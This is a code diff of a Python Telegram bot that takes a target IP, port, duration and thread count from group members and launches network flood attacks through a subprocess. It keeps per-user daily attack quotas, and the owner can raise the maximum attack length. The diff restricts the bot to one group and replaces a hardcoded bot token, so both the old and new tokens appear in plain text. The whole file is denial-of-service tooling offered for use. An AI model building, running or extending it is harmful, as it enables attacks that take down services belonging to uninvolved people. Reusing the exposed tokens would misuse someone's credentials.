@@ -3,18 +3,26 @@ import asyncio
 from telegram import Update, ReplyKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackContext
 
-TELEGRAM_BOT_TOKEN = '7094229080:AAEDql1mLp-JEEpw9n9vBzRDfVZ965mzPy8'  # Replace with your bot token
+TELEGRAM_BOT_TOKEN = '8146585403:AAFJYRvEErZ9NuZ9ufyf8cvXyWOzs0lIB4k'  # Replace with your bot token
 OWNER_USERNAME = "Riyahacksyt"  # Replace with your Telegram username (without @)
+ALLOWED_GROUP_ID = -1002380705719  # Replace with your allowed group ID
 
-is_attack_running = False  # Track if an attack is running
-max_duration = 300  # Max attack duration in seconds
-daily_attack_limit = 30  # Max attacks per user per day
-user_attacks = {}  # Store user attack counts {user_id: remaining_attacks}
+is_attack_running = False  
+max_duration = 300  
+daily_attack_limit = 30  
+user_attacks = {}  
+
+# Check if bot is used in the allowed group
+def is_allowed_group(update: Update):
+    chat = update.effective_chat
+    return chat.type in ['group', 'supergroup'] and chat.id == ALLOWED_GROUP_ID
 
 # Start Command
 async def start(update: Update, context: CallbackContext):
-    user_id = update.effective_user.id
+    if not is_allowed_group(update):
+        return  
 
+    user_id = update.effective_user.id
     if user_id not in user_attacks:
         user_attacks[user_id] = daily_attack_limit
 
@@ -30,11 +38,13 @@ async def start(update: Update, context: CallbackContext):
     
     await update.message.reply_text(text=message, parse_mode='Markdown', reply_markup=reply_markup)
 
-# Attack Command (Only one attack at a time)
+# Attack Command
 async def attack(update: Update, context: CallbackContext):
     global is_attack_running  
-    user_id = update.effective_user.id
+    if not is_allowed_group(update):
+        return  
 
+    user_id = update.effective_user.id
     if is_attack_running:
         await update.message.reply_text("⚠️ *Please wait! Another attack is already running.*", parse_mode='Markdown')
         return
@@ -59,8 +69,8 @@ async def attack(update: Update, context: CallbackContext):
         await update.message.reply_text(f"❌ *Attack duration exceeds the max limit ({max_duration} sec)!*", parse_mode='Markdown')
         return
 
-    is_attack_running = True  # Mark attack as running
-    user_attacks[user_id] -= 1  # Deduct 1 attack
+    is_attack_running = True  
+    user_attacks[user_id] -= 1  
     remaining_attacks = user_attacks[user_id]
 
     await update.message.reply_text(
@@ -75,7 +85,7 @@ async def attack(update: Update, context: CallbackContext):
 
     asyncio.create_task(run_attack(update.effective_chat.id, ip, port, duration, threads, context))
 
-# Run Attack (Non-blocking)
+# Run Attack
 async def run_attack(chat_id, ip, port, duration, threads, context):
     global is_attack_running
     try:
@@ -86,13 +96,11 @@ async def run_attack(chat_id, ip, port, duration, threads, context):
         )
         await process.communicate()
     finally:
-        is_attack_running = False  # Mark attack as finished
+        is_attack_running = False  
         await context.bot.send_message(chat_id=chat_id, text="✅ *Attack Completed!*", parse_mode='Markdown')
 
 # Set Max Attack Duration
 async def set_max_duration(update: Update, context: CallbackContext):
-    global max_duration
-
     if update.effective_user.username != OWNER_USERNAME:
         await update.message.reply_text("❌ *Only the owner can set max duration!*", parse_mode='Markdown')
         return
@@ -102,6 +110,7 @@ async def set_max_duration(update: Update, context: CallbackContext):
         await update.message.reply_text("⚠️ *Usage: /setmaxduration <seconds>*", parse_mode='Markdown')
         return
 
+    global max_duration
     max_duration = min(int(args[0]), 3600)  
     await update.message.reply_text(f"✅ *Max attack duration set to {max_duration} seconds!*")
 
